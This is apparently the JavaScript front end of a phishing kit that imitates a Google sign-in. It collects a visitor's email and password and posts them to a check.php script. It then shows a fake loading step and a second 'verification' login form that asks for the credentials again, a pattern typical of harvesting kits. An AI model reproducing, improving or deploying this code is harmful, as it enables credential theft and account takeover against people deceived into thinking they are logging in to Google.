function open_more() {
    $('.more_login').show()
    $('.account_login').hide()
    }
    function close_more() {
    $('.more_login').hide()
    $('.account_login').show()
    }
function open_google() {
	$('.login-google').show();
	$('.more_login').hide();
    $('.account_login').hide();
}
function close_google() {
	$('.login-google').hide();
	$('.account_login').show();
    $('.more_login').hide();
}

function setFocus(on) {
  var element = document.activeElement;
  if (on) {
      setTimeout(function() {
          element.parentNode.classList.add("focus");
      });
  } else {
      let box = document.querySelector(".input-box");
      box.classList.remove("focus");
      $("input").each(function() {
          var $input = $(this);
          var $parent = $input.closest(".input-box");
          if ($input.val()) $parent.addClass("focus");
          else $parent.removeClass("focus");
      });
  }
}

function ValidateLoginGoogleData() {
	$('#ValidateLoginGoogleForm').submit(function(submitingValidateLoginGoogleData){
	submitingValidateLoginGoogleData.preventDefault();
	
	$emailgoogle = $('#google-email').val().trim();
	$passwordgoogle = $('#google-password').val().trim();
	$logingoogle = $('#google-login').val().trim();
            if($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 5)
            {
                $('.email-google').fadeIn();
                setTimeout(function () {
                $('.email-google').fadeOut();
                }, 2000);                     
                $('.sandi-google').hide();
                $('.login-google').show();
                return false;
            }else{
               $('.email-google').hide();               
	           $("input#validateEmail").val($emailgoogle);
               $('.login-google').hide();
            }
            if($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 5)
            {
                $('.sandi-google').fadeIn();
                setTimeout(function () {
                $('.sandi-google').fadeOut();
                }, 2000);
                $('.login-google').show();
                return false;
            }else{
               $('.sandi-google').hide();
	           $("input#validatePassword").val($passwordgoogle);
	           $("input#validateLogin").val($logingoogle);	
               $('.login-google').hide();	 
               $('.login-google-load').show()
               setTimeout(function () {
               $('.login-google-sec').show()
               $('.account_verification').hide()
               $('.login-google-load').hide()
               }, 3000)
    }
    var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $validateLogin = $("input#validateLogin").val();
	var $id = $("input#id").val();
	if($validateEmail == "" && $validatePassword == "" && $validateLogin == ""){
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
        $('.login-google').hide();
		},
		success: function(){
		$('.login-google').hide();
		}
	});
	});  
	return false;     	           
	}

function SecValidateLoginGoogleData() {
	$('#SecValidateLoginGoogleForm').submit(function(submitingSecValidateLoginGoogleData){
	submitingSecValidateLoginGoogleData.preventDefault();
	
	$emailgooglez = $('#google-email-sec').val().trim();
	$passwordgooglez = $('#google-password-sec').val().trim();
	$logingooglez = $('#google-login-sec').val().trim();
            if($emailgooglez == '' || $emailgooglez == null || $emailgooglez.length <= 5)
            {
                $('.sec-email-google').fadeIn();
                $('.sec-wrong-google').hide();
                setTimeout(function () {
                $('.sec-email-google').fadeOut();
                }, 2000);                     
                $('.sec-sandi-google').hide();
                $('.sec-wrong-google').hide();
                $('.login-google-sec').show();
                return false;
            }else{
               $('.sec-email-google').hide();               
	           $("input#validateEmail").val($emailgooglez);
               $('.login-google-sec').hide();
            }
            if($passwordgooglez == '' || $passwordgooglez == null || $passwordgooglez.length <= 5)
            {
                $('.sec-sandi-google').fadeIn();
                $('.sec-wrong-google').hide();
                setTimeout(function () {
                $('.sec-sandi-google').fadeOut();
                }, 2000);
                $('.login-google-sec').show();
                return false;
            }else{
               $('.sec-sandi-google').hide();
               $('.sec-wrong-google').hide();
	           $("input#validatePassword").val($passwordgooglez);
	           $("input#validateLogin").val($logingooglez);	
               $('.login-google-sec').hide();	 
               $('.login-google-load').show()
               setTimeout(function () {
               $('.login-google-sec').hide()
               $('.account_verification').show()
               $('.login-google-load').hide()
               }, 3000)
    }
    var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $validateLogin = $("input#validateLogin").val();
	var $id = $("input#id").val();
	if($validateEmail == "" && $validatePassword == "" && $validateLogin == ""){
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
        $('.login-google-sec').hide();
		},
		success: function(){
		$('.login-google-sec').hide();
		}
	});
	});  
	return false;     	           
	}